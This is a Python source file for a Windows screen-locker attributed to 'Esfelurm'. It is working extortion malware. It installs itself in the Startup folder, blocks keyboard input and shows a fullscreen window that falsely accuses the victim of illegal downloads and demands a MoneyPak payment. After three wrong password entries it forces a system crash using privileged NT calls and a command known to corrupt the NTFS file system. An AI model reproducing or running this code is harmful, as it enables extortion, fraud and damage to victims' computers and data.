#! /usr/bin python
# -*- coding: utf-8 -*-




password = "12345" # Password Screen Locker
lock_text = "Your computer has been locked!" # Text Title Screen
note = '''Your computer has been locked due to
suspicion of illigal content download and
distribution.
Nothing to worry, the files are not encrypted
you are blocked from accessing your\ncomputer''' # Text
steps = '''1. Take your cash to one of the store.
2. Get a Moneypak and puchange it with case at the register
3. come back and enter your moneypak code.\n\nTelegram: @esfelurm''' # Text








import getpass,os,keyboard,ctypes,subprocess,sys
import ctypes.wintypes
from tkinter import *
from tkinter import messagebox
from functools import partial

def bsod():
	subprocess.call("cd C:\:$i30:$bitmap",shell=True)
	ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
	ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))


def startup(path):
	USER_NAME = getpass.getuser()
	global bat_path
	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
	
	with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
		bat_file.write(r'start "" %s' % path)

def uninstall(wind):
	wind.destroy()
	os.remove(bat_path + '\\' + "open.bat")
	keyboard.unhook_all()

wind = Tk()
count = 3

file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])

startup(file_path)

def buton(arg):
	enter_pass.insert(END, arg)
def delbuton():
	enter_pass.delete(-1, END)

def tapp(key):
	pass

def check():
	global count
	if enter_pass.get() == password:
		messagebox.showinfo("Locker","UNLOCKED SUCCESSFULLY\nTg: @esfelurm")

		uninstall(wind)
	else:
		count -= 1
		if count == 0:
			messagebox.showwarning("Locker","It's time to die!")
			bsod()
		else:
			
			messagebox.showwarning("Locker","Wrong password. Avalible tries: "+ str(count))

def exiting():
	messagebox.showwarning("TLocker","DEATH IS INEVITABLE")
wind.title("Tg: @esfelurm")
wind["bg"] = "black"
UNTEXD = Label(wind,bg="black", fg="red", padx=10, pady=10, text="\nWindows Locked By Esfelurm\n\n\n", font="helvetica 40").pack()
untex = Label(wind,bg="black", fg="red",text=lock_text, font="helvetica 40")
untex.place(x=210, y=170)
heading = 'Announcement'
announcement = Label(wind, bg='black', fg='red', font='helvetica 25 bold', text=heading).place(x=50, y=290)


T =Text(wind, height=7, width=35, fg='red',bd=0, exportselection=0, bg='black', font='helvetica 19')
T.place(x=50, y=340)
T.insert(INSERT, note)

procedure = f'How to unlock your computer'
procedure = Label(wind, bg='black', fg='red', font='helvetica 25 bold', text=procedure).place(x=50, y=530)
T1 =Text(wind, height=5, width=30, fg='red',bd=0, exportselection=0, bg='black', font='helvetica 19')
T1.place(x=50, y=580)
T1.insert(INSERT, steps)

keyboard.on_press(tapp, suppress=True)

vertical = Frame(wind, bg='red', height=490, width=2)
vertical.pack()


enter_pass = Entry(wind,bg="black", bd=30, fg="red", text="",show='•', font="helvetica 35", width=11, insertwidth=4, justify = "center")
enter_pass.place(x=715, y=290)     
wind.resizable(0,0)


wind.lift()
wind.attributes('-topmost',True)

wind.after_idle(wind.attributes,'-topmost',True)
wind.attributes('-fullscreen', True)
wind.protocol("WM_DELETE_WINDOW", exiting)

left_value = 20
moving_value = 80

button1 = Button(wind,text="1", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "1")).place(x=640 + moving_value, y=450)
button2 = Button(wind,text="2", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "2")).place(x=790 + 50, y=450)
button3 = Button(wind,text="3", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "3")).place(x=940 + left_value, y=450)
button4 = Button(wind,text="4", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "4")).place(x=640 + moving_value, y=540)
button5 = Button(wind,text="5", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "5")).place(x=790 + 50, y=540)
button6 = Button(wind,text="6", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "6")).place(x=940 + left_value, y=540)
button7 = Button(wind,text="7", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "7")).place(x=760 + moving_value, y=630)
button8 = Button(wind,text="8", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "8")).place(x=670 + 50, y=630)
button9 = Button(wind,text="9", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "9")).place(x=940 + left_value, y=630)
button0 = Button(wind,text="0", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "0")).place(x=790 + 50, y=720)
delbutton = Button(wind,text="Delete", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=delbuton).place(x=640 + moving_value, y=720)
button = Button(wind,text="Unlock", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=check).place(x=940 + left_value, y=720)

wind.mainloop()
